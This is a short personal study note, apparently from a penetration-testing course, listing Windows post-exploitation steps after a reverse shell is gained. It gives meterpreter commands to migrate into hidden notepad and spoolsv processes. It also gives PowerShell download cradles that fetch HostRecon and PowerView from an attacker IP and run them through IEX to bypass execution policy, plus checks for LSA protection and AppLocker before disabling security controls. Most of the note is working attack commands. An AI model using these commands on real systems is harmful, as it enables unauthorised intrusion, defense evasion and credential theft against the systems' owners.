---
title: Steps
draft: false
tags:
---
 
1. Craft the payload using the techniques learned
2. When we manage to get a reverse shell, if we used a programming language reverse shell (for example based on the aspx web shell), we need to migrate to a different process like `explorer.exe` (requires interactive logon).
3. Identify if its an interactive or network logon. We can check it by identifying the running processes using `ps` in meterpreter. If we dont see the typical explorer.exe, we know its a non-interactive login. To solve this run:
```powershell
meterpreter> execute -H -f notepad # create a hidden notepad process
meterpreter> migrate NOTEPAD_PID # migrate into the new process
```

4. Run the WinPEAS and the [HostRecon](https://github.com/dafthack/HostRecon) script to enumerate the AV in place:
```powershell
meterpreter> shell
C:\> powershell
PS C:\> (new-object system.net.webclient).downloadstring('http://192.168.45.177/HostRecon.ps1') | IEX # bypass powershell execution policy 
PS C:\> Invoke-HostRecon
```

If Windows Defender is used, it includes AMSI. Check if LAPS is in use.

5. Check is LSA protection is enabled (we can dump hashes from LSASS or not):
```powershell
PS C:\> Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"
```

If its enabled, we cannot directly obtain NTLM hashes from LSASS.

6. Finally, identify if Application Whitelisting is in place. If Windows Defender is the AV, whitelisting should be done through AppLocker:
```powershell
PS C:\> Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe
```

7. Disable all the security controls
8. Upload and enumerate the domain using PowerView or BloodHound via download cradles:
```powershell
PS C:\> (new-object system.net.webclient).downloadstring('http://192.168.45.177/powerview.ps1') | IEX
```


If administrator meterpreter:
1. Get a stable shell migtating into the spoolsv process:
```powershell
meterpreter> ps spoolsv
meterpreter> migrate PID
```

